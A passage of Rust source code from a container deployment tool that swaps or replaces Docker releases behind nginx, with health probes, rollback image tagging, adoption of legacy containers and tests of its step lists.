        .env(IMAGE_ENV, image);
    let outcome = run.exec(&spec)?;
    if !outcome.success() {
        return Err(DeployError::Estate(format!(
            "green start failed: {}",
            outcome.stderr_trimmed()
        )));
    }
    Ok(())
}

/// Starts (or recreates) the live service in place.
fn start_live(run: &mut Run, app: &App, release: &str, port: u16) -> Result<(), DeployError> {
    let compose_file = compose::resolve_compose_file(&app.compose_dir)?;
    let project = app.compose_project();
    let image = app.image_ref(release).unwrap_or_default();
    let extra: Vec<&Path> = app.compose_override.iter().map(PathBuf::as_path).collect();
    let spec = compose::up_detached(&compose_file, &project, &extra, &app.compose_svc)
        .env(app.env_name.clone(), port.to_string())
        .env(IMAGE_ENV, image);
    let outcome = run.exec(&spec)?;
    if !outcome.success() {
        return Err(DeployError::Estate(format!(
            "start failed: {}",
            outcome.stderr_trimmed()
        )));
    }
    Ok(())
}

/// Renders the estate with this app's live port moved, validates it, and applies.
fn apply_new_state(
    run: &mut Run,
    ctx: &DeployContext,
    app: &App,
    new_live_port: u16,
) -> Result<(), DeployError> {
    let loaded = registry::load_dir(&ctx.registry_dir)
        .map_err(|e| DeployError::Io(format!("read {}: {e}", ctx.registry_dir.display())))?;
    let mut apps = loaded.sorted();
    let Some(entry) = apps.iter_mut().find(|a| a.name == app.name) else {
        return Err(DeployError::Estate(format!(
            "{} vanished from the registry",
            app.name
        )));
    };
    // Simulate the post-commit registry, not a halfway state: when the port
    // moves, the current live port becomes the rollback target. Without this,
    // rolling back to the recorded old port looks like live-equals-old and
    // fails validation. When the port stays (replace), old is left alone.
    if entry.live_port != Some(new_live_port) {
        entry.old_port = entry.live_port;
    }
    entry.live_port = Some(new_live_port);

    let mut problems = Vec::new();
    for a in &apps {
        problems.extend(a.problems());
    }
    problems.extend(crate::validator::validate(
        &apps,
        &crate::validator::TunnelRoutes::new(),
    ));
    let seq = run.next_seq();
    let errors = problems.iter().filter(|p| p.is_error()).count();
    run.record_step(
        StepRecord::new(
            seq,
            "render-validate",
            crate::trace::StepStatus::Ok,
            &["render".to_string()],
        )
        .with_detail(json!({"errors": errors, "warnings": problems.len() - errors})),
    )?;
    if errors > 0 {
        return Err(DeployError::ValidationFailed(errors));
    }

    let text = render::render(&apps);
    let _nginx_lock = hold(run, ctx, lock::nginx_lock_name())?;
    apply::apply(&mut *run, &text, &ctx.apply_paths)?;
    Ok(())
}

/// True when the rendered config differs from the file on disk.
fn config_changed(ctx: &DeployContext, app: &App, port: u16) -> Result<bool, DeployError> {
    // Resolve the compose file even when the rendered config is unchanged: the
    // start step that follows needs it, and a missing file should fail with the
    // resolver's clear message rather than as a generic compose error later.
    let _compose_file = compose::resolve_compose_file(&app.compose_dir)?;
    let loaded = registry::load_dir(&ctx.registry_dir)
        .map_err(|e| DeployError::Io(format!("read {}: {e}", ctx.registry_dir.display())))?;
    let mut apps = loaded.sorted();
    if let Some(entry) = apps.iter_mut().find(|a| a.name == app.name) {
        entry.live_port = Some(port);
    }
    let text = render::render(&apps);
    match std::fs::read_to_string(&ctx.apply_paths.target) {
        Ok(current) => Ok(current != text),
        Err(_) => Ok(true),
    }
}

/// Probes every hostname's front port with the right Host header.
fn probe_front(run: &mut Run, app: &App) -> Result<(), DeployError> {
    if app.hostnames.is_empty() {
        record_skip(run, "probe-front", "no hostnames; nothing to probe")?;
        return Ok(());
    }
    if run.mode() == RunMode::DryRun {
        // There is no nginx in a dry run, and dialing the front port would just
        // be a refused connection. Record the probe that a live run would make.
        for host in &app.hostnames {
            let seq = run.next_seq();
            run.record_step(
                StepRecord::new(seq, "probe-front", crate::trace::StepStatus::DryRun, &[])
                    .with_detail(json!({
                        "dry_run": true,
                        "host": host,
                        "front_port": app.front_port,
                    })),
            )?;
        }
        return Ok(());
    }
    for host in &app.hostnames {
        // `nginx -s reload` returns before its new workers accept, so the first
        // request after a flip can still be answered by an old worker pointing
        // at the release just stopped. Give the front door a moment to catch up
        // instead of failing a good deploy on that one answer.
        let mut code: Option<u16> = None;
        let mut last = String::new();
        for attempt in 1..=FRONT_PROBE_ATTEMPTS {
            match health::http_status_with_host("127.0.0.1", app.front_port, "/", host) {
                Ok(status) => {
                    code = Some(status);
                    if (200..400).contains(&status) {
                        break;
                    }
                    last = format!("HTTP {status}");
                }
                Err(e) => {
                    code = None;
                    last = e;
                }
            }
            if attempt < FRONT_PROBE_ATTEMPTS {
                std::thread::sleep(FRONT_PROBE_INTERVAL);
            }
        }
        let seq = run.next_seq();
        let failed = !matches!(code, Some(code) if (200..400).contains(&code));
        let mut record = StepRecord::new(
            seq,
            "probe-front",
            if failed {
                crate::trace::StepStatus::Error
            } else {
                crate::trace::StepStatus::Ok
            },
            &[],
        )
        .with_detail(json!({
            "host": host,
            "front_port": app.front_port,
            "status": code,
            "attempts": FRONT_PROBE_ATTEMPTS,
        }));
        if failed {
            record = record.with_error(format!(
                "the front door for {host} failed the check: {last}"
            ));
        }
        run.record_step(record)?;
        if failed {
            return Err(HealthError::ProbeFailed {
                url: format!("http://127.0.0.1:{}/ (Host: {host})", app.front_port),
                attempts: FRONT_PROBE_ATTEMPTS,
                last,
            }
            .into());
        }
    }
    Ok(())
}

/// Lets old workers drain before stopping the old container.
fn drain(run: &mut Run, ctx: &DeployContext) -> Result<(), DeployError> {
    let spec = StepSpec::new("drain-wait", "sleep").arg(ctx.drain_secs.to_string());
    run.exec(&spec)?;
    Ok(())
}

/// What retaining the outgoing image should do.
#[derive(Debug, PartialEq, Eq)]
enum RetainPlan {
    Skip(&'static str),
    Tag { release: String, target: String },
}

/// Decides which tag to write for the image being replaced.
///
/// `replaced` is the release that is live *before* the commit, never
/// `app.old_release`: during a rollback `old_release` is the release being
/// deployed, and tagging the outgoing image with it corrupts the rollback tag.
fn retain_plan(app: &App, replaced: Option<&str>, deploying: &str) -> RetainPlan {
    let Some(replaced) = replaced else {
        return RetainPlan::Skip("no live release yet; nothing older to retain");
    };
    if replaced == deploying {
        return RetainPlan::Skip(
            "the live release is the one being deployed (force redeploy); \
             leaving the rollback tag untouched",
        );
    }
    let Some(target) = app.image_ref(replaced) else {
        return RetainPlan::Skip("no image_repo; nothing to tag");
    };
    RetainPlan::Tag {
        release: replaced.to_string(),
        target,
    }
}

/// What to do with a tag that may already exist.
#[derive(Debug, PartialEq, Eq)]
enum TagDecision {
    /// The tag is absent: write it.
    Tag,
    /// The tag already names this exact image: nothing to do.
    AlreadyTagged,
    /// The tag names another image: never overwrite it.
    Conflict,
}

fn tag_decision(existing: Option<&str>, live_image_id: &str) -> TagDecision {
    match existing {
        None => TagDecision::Tag,
        Some(existing) if existing == live_image_id => TagDecision::AlreadyTagged,
        Some(_) => TagDecision::Conflict,
    }
}

/// Reads one image tag's image id. Missing tags are a result, not an error.
fn inspect_tag_run(tag: &str) -> StepSpec {
    StepSpec::new("docker-inspect-tag", "docker")
        .args(["image", "inspect", "--format", "{{.Id}}"])
        .arg(tag)
}

/// Preserves the image of the release being replaced under its release tag.
///
/// The old container is about to be removed, so this is the last moment the
/// image is reachable by ID. A later `rollback` asks for
/// `image_repo:<replaced>`; without this step that tag can be missing even
/// though the image is still in the daemon.
///
/// A tag that already points at a different image is left alone and recorded:
/// silently retagging it would hide (or create) a provenance mismatch, and the
/// next deploy would run an image that is not the release it names.
fn retain_old_image(
    run: &mut Run,
    app: &App,
    replaced: Option<&str>,
    deploying: &str,
) -> Result<(), DeployError> {
    let (release, target) = match retain_plan(app, replaced, deploying) {
        RetainPlan::Skip(reason) => {
            record_skip(run, "retain-old-image", reason)?;
            return Ok(());
        }
        RetainPlan::Tag { release, target } => (release, target),
    };
    let Some(port) = app.live_port else {
        record_skip(run, "retain-old-image", "no live port; nothing to retain")?;
        return Ok(());
    };

    if run.mode() == RunMode::DryRun {
        let seq = run.next_seq();
        run.record_step(
            StepRecord::new(
                seq,
                "retain-old-image",
                crate::trace::StepStatus::DryRun,
                &["docker".to_string(), "tag".to_string(), target.clone()],
            )
            .with_detail(json!({
                "replaced": release,
                "deploying": deploying,
                "image": target,
            })),
        )?;
        return Ok(());
    }

    let found = run.exec(&docker::ps_publishing(port))?;
    if !found.success() {
        return Err(DeployError::Estate(format!(
            "could not list containers publishing {port} while retaining {release}: {}",
            found.stderr_trimmed()
        )));
    }
    let names: Vec<&str> = found
        .stdout
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .collect();
    if names.is_empty() {
        record_skip(
            run,
            "retain-old-image",
            &format!("nothing publishes {port}; no image to tag"),
        )?;
        return Ok(());
    }

    let mut tagged = Vec::new();
    let mut already = Vec::new();
    for name in names {
        let id = run.exec(&docker::inspect_image_id(name))?;
        if !id.success() || id.stdout_trimmed().is_empty() {
            continue;
        }
        let image_id = id.stdout_trimmed().to_string();

        // A missing tag exits non-zero. That is a normal answer here, so use
        // the untraced read-only chokepoint and report the decision in the
        // summary step instead of logging an expected miss as an error.
        let existing = crate::exec::run_capture(&inspect_tag_run(&target))?;
        let existing_id = existing
            .success()
            .then(|| existing.stdout_trimmed().to_string())
            .filter(|s| !s.is_empty());

        match tag_decision(existing_id.as_deref(), &image_id) {
            TagDecision::Tag => {
                let tag = run.exec(&docker::tag(&image_id, &target))?;
                if !tag.success() {
                    return Err(DeployError::Estate(format!(
                        "could not tag old image {image_id} as {target}: {}",
                        tag.stderr_trimmed()
                    )));
                }
                tagged.push(json!({
                    "container": name,
                    "image_id": image_id,
                    "tag": target.clone(),
                }));
            }
            TagDecision::AlreadyTagged => already.push(json!({
                "container": name,
                "image_id": image_id,
                "tag": target.clone(),
            })),
            TagDecision::Conflict => {
                // Never overwrite a tag that names another image: the rollback
                // would later run code that is not the release it names. Abort
                // before the old container is stopped, so the app keeps serving.
                let existing_image_id = existing_id.unwrap_or_default();
                let seq = run.next_seq();
                run.record_step(
                    StepRecord::new(
                        seq,
                        "retain-old-image",
                        crate::trace::StepStatus::Error,
                        &["docker".to_string(), "tag".to_string(), target.clone()],
                    )
                    .with_detail(json!({
                        "replaced": release,
                        "deploying": deploying,
                        "container": name,
                        "existing_image_id": existing_image_id,
                        "live_image_id": image_id,
                    }))
                    .with_error(format!(
                        "tag {target} already points at {existing_image_id}, not at the live image {image_id}"
                    )),
                )?;
                return Err(DeployError::TagConflict {
                    container: name.to_string(),
                    tag: target,
                    existing_image_id,
                    live_image_id: image_id,
                });
            }
        }
    }

    let seq = run.next_seq();
    run.record_step(
        StepRecord::new(
            seq,
            "retain-old-image",
            crate::trace::StepStatus::Ok,
            &["docker".to_string(), "tag".to_string(), target.clone()],
        )
        .with_detail(json!({
            "replaced": release,
            "deploying": deploying,
            "tagged": tagged,
            "already_tagged": already,
        })),
    )?;
    Ok(())
}

/// Stops and removes every container publishing `port`, if any.
///
/// A non-zero `docker stop` or `rm` is a hard error: the caller must not commit
/// a release while an old container still holds the port. The old image has
/// already been retained, so a retry can still roll back.
fn stop_publishing(run: &mut Run, port: Option<u16>) -> Result<(), DeployError> {
    let Some(port) = port else {
        record_skip(run, "stop-old", "no previous container; first swapdock")?;
        return Ok(());
    };
    if run.mode() == RunMode::DryRun {
        record_skip(
            run,
            "stop-old",
            &format!("dry-run: would stop and remove containers publishing {port}"),
        )?;
        return Ok(());
    }
    let found = run.exec(&docker::ps_publishing(port))?;
    if !found.success() {
        return Err(DeployError::Estate(format!(
            "could not list containers publishing {port} to stop them: {}",
            found.stderr_trimmed()
        )));
    }
    let names: Vec<String> = found
        .stdout
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .map(str::to_string)
        .collect();
    if names.is_empty() {
        record_skip(
            run,
            "stop-old",
            &format!("nothing publishes {port}; already gone"),
        )?;
        return Ok(());
    }
    for name in names {
        let stopped = run.exec(&docker::stop(&name))?;
        if !stopped.success() {
            return Err(DeployError::StopFailed {
                container: name,
                port,
                stderr: stopped.stderr_trimmed().to_string(),
            });
        }
        let removed = run.exec(&docker::rm(&name))?;
        if !removed.success() {
            return Err(DeployError::RemoveFailed {
                container: name,
                stderr: removed.stderr_trimmed().to_string(),
            });
        }
    }
    Ok(())
}

/// Advances the registry and writes it back atomically.
/// True when the durable registry file already records this release.
fn registry_has_release(ctx: &DeployContext, app: &str, release: &str) -> bool {
    registry::load_dir(&ctx.registry_dir)
        .ok()
        .and_then(|loaded| {
            loaded
                .apps
                .into_iter()
                .find(|candidate| candidate.name == app)
        })
        .and_then(|candidate| candidate.release)
        .is_some_and(|saved| saved == release)
}

fn commit_release(
    run: &mut Run,
    ctx: &DeployContext,
    app: &mut App,
    release: String,
    new_live_port: u16,
) -> Result<(), DeployError> {
    let old_live = app.live_port;
    app.advance(release.clone(), new_live_port);

    if run.mode() == RunMode::DryRun {
        let seq = run.next_seq();
        run.record_step(
            StepRecord::new(
                seq,
                "registry-commit",
                crate::trace::StepStatus::DryRun,
                &["registry-commit".to_string()],
            )
            .with_detail(json!({
                "release": release,
                "live_port": [old_live, Some(new_live_port)],
            })),
        )?;
        return Ok(());
    }

    registry::save_app(&ctx.registry_dir, app)
        .map_err(|e| DeployError::Io(format!("save {}: {e}", app.name)))?;
    let seq = run.next_seq();
    run.record_step(
        StepRecord::new(
            seq,
            "registry-commit",
            crate::trace::StepStatus::Ok,
            &[
                "save".to_string(),
                ctx.registry_dir
                    .join(format!("{}.toml", app.name))
                    .display()
                    .to_string(),
            ],
        )
        .with_detail(json!({"release": release, "live_port": new_live_port})),
    )?;
    Ok(())
}

/// Writes a generated state file, or records the intent in dry-run.
fn write_state_file(run: &mut Run, path: &Path, text: &str) -> Result<(), DeployError> {
    if run.mode() == RunMode::DryRun {
        let seq = run.next_seq();
        run.record_step(
            StepRecord::new(
                seq,
                "green-override",
                crate::trace::StepStatus::DryRun,
                &["write".to_string(), path.display().to_string()],
            )
            .with_detail(json!({"bytes": text.len()})),
        )?;
        return Ok(());
    }
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|e| DeployError::Io(format!("create {}: {e}", parent.display())))?;
    }
    std::fs::write(path, text)
        .map_err(|e| DeployError::Io(format!("write {}: {e}", path.display())))?;
    Ok(())
}

/// Records a step that was deliberately not taken, with the reason.
fn record_skip(run: &mut Run, name: &'static str, reason: &str) -> Result<(), DeployError> {
    let seq = run.next_seq();
    let status = if run.mode() == RunMode::DryRun {
        crate::trace::StepStatus::DryRun
    } else {
        crate::trace::StepStatus::Ok
    };
    run.record_step(
        StepRecord::new(seq, name, status, &[]).with_detail(json!({"skipped": reason})),
    )?;
    Ok(())
}

/// First 7 hex characters of a release, for container names.
fn short_sha(release: &str) -> &str {
    &release[..release.len().min(7)]
}

// ---------------------------------------------------------------------------
// adoption
// ---------------------------------------------------------------------------

/// Adopts a legacy container that publishes `front_port` directly.
///
/// This is the first-run path for a `replace` app. It deliberately does **not**
/// deploy a new release: `release` is the commit the legacy container is already
/// running. The sequence is:
///
/// ```text
/// estate-lock -> app-lock -> inspect-legacy -> tag-old-image -> compose-config
///      -> adopt-override -> stop-legacy -> start-adopted -> health-wait
///      -> apply(nginx front -> back) -> probe-front -> remove-legacy
///      -> registry-commit
/// ```
///
/// The legacy container is stopped before the cutover but **not removed** until
/// the adopted release has passed both the health gate and the front probe. If
/// anything after the stop fails, it is restarted and the registry is left
/// unchanged, so the operator still has the old app rather than a dead port.
///
/// After it succeeds, the app has a recorded release, a live back port and a
/// nginx block; the next `swapdock up <app> --release <new>` uses the normal
/// replace strategy and records the adopted release as `old_release`.
pub fn adopt(
    run: &mut Run,
    ctx: &DeployContext,
    app: &mut App,
    release: &str,
    healthcheck: Option<&str>,
    container_port: Option<u16>,
) -> Result<(), DeployError> {
    if !registry::is_valid_release_arg(release) {
        return Err(DeployError::InvalidRelease(release.to_string()));
    }

    let _estate_lock = hold(run, ctx, lock::estate_lock_name())?;
    let _app_lock = hold(run, ctx, &lock::app_lock_name(&app.name))?;
    reload_app(ctx, app)?;

    if app.kind != registry::Kind::Container {
        return Err(DeployError::Adopt {
            app: app.name.clone(),
            reason: "only container apps can be adopted".into(),
        });
    }
    refuse_if_broken(run, ctx)?;

    if app.live_port.is_some() {
        return Err(DeployError::Adopt {
            app: app.name.clone(),
            reason: "the registry already has live_port; use `swapdock up` instead".into(),
        });
    }
    if app.compose_override.is_some() {
        return Err(DeployError::Adopt {
            app: app.name.clone(),
            reason: "compose_override is already set; this app was adopted".into(),
        });
    }
    let Some(image_ref) = app.image_ref(release) else {
        return Err(DeployError::Adopt {
            app: app.name.clone(),
            reason: "a container app needs image_repo".into(),
        });
    };

    if run.mode() == RunMode::DryRun {
        let seq = run.next_seq();
        run.record_step(
            StepRecord::new(seq, "adopt", crate::trace::StepStatus::DryRun, &[]).with_detail(
                json!({
                    "release": release,
                    "front_port": app.front_port,
                    "slot": app.slot,
                    "container_port": container_port,
                    "healthcheck": healthcheck,
                    "image": image_ref,
                }),
            ),
        )?;
        return Ok(());
    }

    backup::before_deploy(run, app, Some(release))?;

    let legacy_name = legacy_container(run, app)?;
    let legacy_image = run.exec(&docker::inspect_image_ref(&legacy_name))?;
    if !legacy_image.success() || legacy_image.stdout_trimmed().is_empty() {
        return Err(DeployError::Adopt {
            app: app.name.clone(),
            reason: format!("could not read the image of legacy container {legacy_name}"),
        });
    }
    let legacy_image = legacy_image.stdout_trimmed().to_string();

    // Preserve the image under this release before the container is removed.
    if legacy_image != image_ref {
        let tagged = run.exec(&docker::tag(&legacy_image, &image_ref))?;
        if !tagged.success() {
            return Err(DeployError::Adopt {
                app: app.name.clone(),
                reason: format!(
                    "could not tag legacy image {legacy_image} as {image_ref}: {}",
                    tagged.stderr_trimmed()
                ),
            });
        }
    }
    let seq = run.next_seq();
    run.record_step(
        StepRecord::new(
            seq,
            "retain-old-image",
            crate::trace::StepStatus::Ok,
            &["docker".to_string(), "tag".to_string(), image_ref.clone()],
        )
        .with_detail(json!({
            "source": legacy_image,
            "tag": image_ref.clone(),
            "container": legacy_name,
        })),
    )?;

    let exists = run.exec(&docker::image_exists(&image_ref))?;
    if !exists.success() {
        return Err(DeployError::Adopt {
            app: app.name.clone(),
            reason: format!("{image_ref} is not in the local daemon after tagging"),
        });
    }

    let compose_file = compose::resolve_compose_file(&app.compose_dir)?;
    let project = app.compose_project();
    let config_out = run.exec(&compose::config_json(
        &compose_file,
        &project,
        &[],
        &app.compose_svc,
    ))?;
    if !config_out.success() {
        return Err(DeployError::Adopt {
            app: app.name.clone(),
            reason: format!(
                "docker compose config failed for {}: {}",
                compose_file.display(),
                config_out.stderr_trimmed()
            ),
        });
    }
    let config: Value =
        serde_json::from_str(config_out.stdout_trimmed()).map_err(|e| DeployError::Adopt {
            app: app.name.clone(),
            reason: format!("docker compose config did not return JSON: {e}"),
        })?;
    let base_has_healthcheck = crate::doctor::healthcheck_present(&config, &app.compose_svc);
    if !base_has_healthcheck && healthcheck.is_none() {
        return Err(DeployError::Adopt {
            app: app.name.clone(),
            reason: "the compose service has no healthcheck; pass --healthcheck \"<command>\" \
                     or add a healthcheck to the compose file"
                .into(),
        });
    }

    let container_port = container_port
        .or(legacy_container_port(run, &legacy_name, app.front_port)?)
        .ok_or_else(|| DeployError::Adopt {
            app: app.name.clone(),
            reason: format!(
                "could not infer the container port of {legacy_name}; pass --container-port"
            ),
        })?;

    let (back_port, _) =
        crate::ports::pair(app.slot).map_err(|e| DeployError::Estate(e.to_string()))?;
    let override_path = adopt_override_path(&ctx.state_dir, &app.name);
    let text = adopt_override(
        &app.compose_svc,
        &app.env_name,
        container_port,
        back_port,
        app.image_repo.as_deref().unwrap_or(""),
        healthcheck,
    );
    write_named_state_file(run, "adopt-override", &override_path, &text)?;
    app.compose_override = Some(override_path.clone());

    let checked = run.exec(&compose::config_quiet(
        &compose_file,
        &project,
        &[override_path.as_path()],
    ))?;
    if !checked.success() {
        return Err(DeployError::Adopt {
            app: app.name.clone(),
            reason: format!(
                "the generated override failed `docker compose config`: {}",
                checked.stderr_trimmed()
            ),
        });
    }

    // Record the cutover before the first host-changing step. An adopted app
    // can be in flight across the same nginx/registry window as a swap; without
    // this record a crash after `apply` leaves nginx on the back port while the
    // registry says the app has no live_port at all.
    if run.mode() != RunMode::DryRun {
        let pending = journal::Pending::new(
            app.name.clone(),
            release.to_string(),
            Some(app.front_port),
            back_port,
            run.id().to_string(),
        );
        journal::write(&ctx.state_dir, &pending)
            .map_err(|e| DeployError::Journal(e.to_string()))?;
    }

    // Everything that could be checked without stopping the legacy container
    // has been checked. Stop it, but keep it on disk: `docker rm` happens only
    // after the adopted release has passed both gates.
    let stopped = run.exec(&docker::stop(&legacy_name))?;
    if !stopped.success() {
        return Err(DeployError::Adopt {
            app: app.name.clone(),
            reason: format!("could not stop {legacy_name}: {}", stopped.stderr_trimmed()),
        });
    }
    let seq = run.next_seq();
    run.record_step(
        StepRecord::new(
            seq,
            "stop-legacy",
            crate::trace::StepStatus::Ok,
            &[
                "docker".to_string(),
                "stop".to_string(),
                legacy_name.clone(),
            ],
        )
        .with_detail(json!({"container": legacy_name})),
    )?;

    let health_path =
        health::checked_probe_path(app_health_url(app)).map_err(DeployError::InvalidHealthPath)?;

    match adopt_cutover(run, ctx, app, release, back_port, &health_path) {
        Ok(()) => {
            // The new release is live and gated; removing the stopped legacy
            // container is now cleanup, not a point of no return. A failed rm
            // is recorded as such but does not hide a successful cutover.
            let _ = remove_legacy(run, &legacy_name);
            if run.mode() != RunMode::DryRun
                && let Err(e) = journal::clear(&ctx.state_dir, &app.name)
            {
                tracing::warn!(app = %app.name, "could not clear pending adopt record: {e}");
            }
            Ok(())
        }
        Err(failure) => {
            let rollback = restart_legacy(run, &legacy_name);
            let rollback = match rollback {
                Ok(()) => format!(
                    "legacy container {legacy_name} was restarted; the registry was not changed"
                ),
                Err(error) => format!(
                    "could not restart legacy container {legacy_name}: {error}; the app is DOWN"
                ),
            };
            Err(DeployError::Adopt {
                app: app.name.clone(),
                reason: format!("{failure}; {rollback}"),
            })
        }
    }
}

/// Starts and gates the adopted release, then points nginx at it.
///
/// The order is deliberate: the container must be healthy *before* nginx is
/// repointed, and the legacy container is still kept until the front probe has
/// answered through the new block.
fn adopt_cutover(
    run: &mut Run,
    ctx: &DeployContext,
    app: &mut App,
    release: &str,
    back_port: u16,
    health_path: &str,
) -> Result<(), DeployError> {
    start_live(run, app, release, back_port)?;
    health::gate_container_with_host(
        run,
        "health-wait",
        back_port,
        health_path,
        app.hostnames.first().map(String::as_str),
    )?;
    apply_new_state(run, ctx, app, back_port)?;
    probe_front(run, app)?;
    commit_release(run, ctx, app, release.to_string(), back_port)?;
    Ok(())
}

/// Best-effort restart of a stopped legacy container. Records the outcome.
fn restart_legacy(run: &mut Run, legacy: &str) -> Result<(), String> {
    let spec = StepSpec::new("docker-start", "docker")
        .arg("start")
        .arg(legacy);
    match run.exec(&spec) {
        Ok(outcome) if outcome.success() => {
            record_adopt_step(
                run,
                "adopt-restore-legacy",
                crate::trace::StepStatus::Ok,
                legacy,
                None,
            );
            Ok(())
        }
        Ok(outcome) => {
            let error = format!(
                "docker start exited with {}: {}",
                outcome
                    .exit_code
                    .map(|c| c.to_string())
                    .unwrap_or_else(|| "?".into()),
                outcome.stderr_trimmed()
            );
            record_adopt_step(
                run,
                "adopt-restore-legacy",
                crate::trace::StepStatus::Error,
                legacy,
                Some(&error),
            );
            Err(error)
        }
        Err(e) => {
            let error = e.to_string();
            record_adopt_step(
                run,
                "adopt-restore-legacy",
                crate::trace::StepStatus::Error,
                legacy,
                Some(&error),
            );
            Err(error)
        }
    }
}

/// Removes the stopped legacy container once adoption has succeeded.
fn remove_legacy(run: &mut Run, legacy: &str) -> Result<(), String> {
    match run.exec(&docker::rm(legacy)) {
        Ok(outcome) if outcome.success() => {
            record_adopt_step(
                run,
                "remove-legacy",
                crate::trace::StepStatus::Ok,
                legacy,
                None,
            );
            Ok(())
        }
        Ok(outcome) => {
            let error = format!("docker rm: {}", outcome.stderr_trimmed());
            record_adopt_step(
                run,
                "remove-legacy",
                crate::trace::StepStatus::Error,
                legacy,
                Some(&error),
            );
            Err(error)
        }
        Err(e) => {
            let error = e.to_string();
            record_adopt_step(
                run,
                "remove-legacy",
                crate::trace::StepStatus::Error,
                legacy,
                Some(&error),
            );
            Err(error)
        }
    }
}

/// Records an adoption cleanup step, ignoring a trace failure on the error path
/// (the original error is more useful than "could not write the log").
fn record_adopt_step(
    run: &mut Run,
    step: &'static str,
    status: crate::trace::StepStatus,
    legacy: &str,
    error: Option<&str>,
) {
    let seq = run.next_seq();
    let argv = ["docker".to_string(), legacy.to_string()];
    let mut record =
        StepRecord::new(seq, step, status, &argv).with_detail(json!({"container": legacy}));
    if let Some(error) = error {
        record = record.with_error(error);
    }
    let _ = run.record_step(record);
}

/// The single container publishing the app's front port, or a clear refusal.
fn legacy_container(run: &mut Run, app: &App) -> Result<String, DeployError> {
    let found = run.exec(&docker::ps_publishing(app.front_port))?;
    if !found.success() {
        return Err(DeployError::Adopt {
            app: app.name.clone(),
            reason: format!("docker ps failed: {}", found.stderr_trimmed()),
        });
    }
    let names: Vec<&str> = found
        .stdout
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .collect();
    match names.as_slice() {
        [one] => Ok((*one).to_string()),
        [] => Err(DeployError::Adopt {
            app: app.name.clone(),
            reason: format!(
                "no container publishes front_port {}; nothing to adopt",
                app.front_port
            ),
        }),
        many => Err(DeployError::Adopt {
            app: app.name.clone(),
            reason: format!(
                "{} containers publish front_port {}: {}; stop the extra ones first",
                many.len(),
                app.front_port,
                many.join(", ")
            ),
        }),
    }
}

/// The container-side port mapped to `front_port`, from Docker's port map.
fn legacy_container_port(
    run: &mut Run,
    container: &str,
    front_port: u16,
) -> Result<Option<u16>, DeployError> {
    let outcome = run.exec(&docker::inspect_ports(container))?;
    if !outcome.success() {
        return Ok(None);
    }
    let Ok(parsed) = serde_json::from_str::<Value>(outcome.stdout_trimmed()) else {
        return Ok(None);
    };
    let Some(map) = parsed.as_object() else {
        return Ok(None);
    };
    let front = front_port.to_string();
    for (key, bindings) in map {
        let Some(container_port) = key.split('/').next().and_then(|p| p.parse::<u16>().ok()) else {
            continue;
        };
        for binding in bindings.as_array().into_iter().flatten() {
            if binding.get("HostPort").and_then(Value::as_str) == Some(front.as_str()) {
                return Ok(Some(container_port));
            }
        }
    }
    Ok(None)
}

/// Path of the persistent compose override generated by `adopt`.
pub fn adopt_override_path(state_dir: &Path, app: &str) -> PathBuf {
    state_dir
        .parent()
        .map(|p| p.join("overrides"))
        .unwrap_or_else(|| PathBuf::from("/srv/swapdock/overrides"))
        .join(format!("{app}.yml"))
}

/// The override that makes a hand-written compose service adoptable.
///
/// Later files win in compose, so this pins the image, replaces the published
/// port instead of appending another one (`!override`) and optionally adds the
/// healthcheck the deploy gate requires.
pub fn adopt_override(
    service: &str,
    env_name: &str,
    container_port: u16,
    back_port: u16,
    image_repo: &str,
    healthcheck: Option<&str>,
) -> String {
    let mut text = format!(
        "# Generated by swapdock adopt; do not edit by hand.\n\
         services:\n  {service}:\n    image: ${{IMAGE:-{image_repo}}}\n    ports: !override\n      - \"127.0.0.1:${{{env_name}:-{back_port}}}:{container_port}\"\n"
    );
    if let Some(command) = healthcheck {
        let quoted = serde_json::to_string(command).unwrap_or_else(|_| "\"true\"".into());
        text.push_str(&format!(
            "    healthcheck:\n      test: [\"CMD-SHELL\", {quoted}]\n      interval: 5s\n      timeout: 5s\n      retries: 24\n      start_period: 10s\n"
        ));
    }
    text
}

// ---------------------------------------------------------------------------
// adoption helpers
// ---------------------------------------------------------------------------

fn write_named_state_file(
    run: &mut Run,
    step: &'static str,
    path: &Path,
    text: &str,
) -> Result<(), DeployError> {
    if run.mode() == RunMode::DryRun {
        let seq = run.next_seq();
        run.record_step(
            StepRecord::new(
                seq,
                step,
                crate::trace::StepStatus::DryRun,
                &["write".to_string(), path.display().to_string()],
            )
            .with_detail(json!({"bytes": text.len()})),
        )?;
        return Ok(());
    }
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|e| DeployError::Io(format!("create {}: {e}", parent.display())))?;
    }
    std::fs::write(path, text)
        .map_err(|e| DeployError::Io(format!("write {}: {e}", path.display())))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    use crate::trace::TraceLog;

    /// Static tests share /srv/www and one test sets a process-global failpoint.
    static STATIC_SERIAL: std::sync::Mutex<()> = std::sync::Mutex::new(());
    use crate::registry::tests::{sample, sample_static};

    #[test]
    fn swap_and_replace_step_lists_are_stable() {
        // The run log groups by step name; renaming or reordering one breaks
        // history queries and the resume logic built on top of them.
        assert_eq!(
            swap_steps(),
            vec![
                "lock",
                "resolve-release",
                "pull",
                "swap-preflight",
                "green-start",
                "health-wait-discover",
                "health-wait-inspect",
                "health-wait-healthy",
                "health-wait-probe",
                "render-validate",
                "apply-stage",
                "apply-backup",
                "apply-commit",
                "nginx-test",
                "nginx-reload",
                "probe-front",
                "drain-wait",
                "retain-old-image",
                "stop-old",
                "registry-commit",
            ]
        );
        assert_eq!(
            replace_steps(),
            vec![
                "lock",
                "resolve-release",
                "pull",
                "render-validate",
                "apply-stage",
                "apply-backup",
                "apply-commit",
                "nginx-test",
                "nginx-reload",
                "retain-old-image",
                "stop-old",
                "start-new",
                "health-wait-discover",
                "health-wait-inspect",
                "health-wait-healthy",
                "health-wait-probe",
                "probe-front",
                "registry-commit",
            ]
        );
    }

    #[test]
    fn every_step_name_is_unique_within_its_strategy() {
        for steps in [swap_steps(), replace_steps()] {
            let mut seen = std::collections::HashSet::new();
            for step in steps {
                assert!(seen.insert(step), "duplicate step {step}");
            }
        }
    }

    #[test]
    fn resolve_prefers_the_flag_then_the_registry() {
        let app = sample();
        assert_eq!(
            resolve_release(&app, Some("abc1234"), false).unwrap(),
            "abc1234"
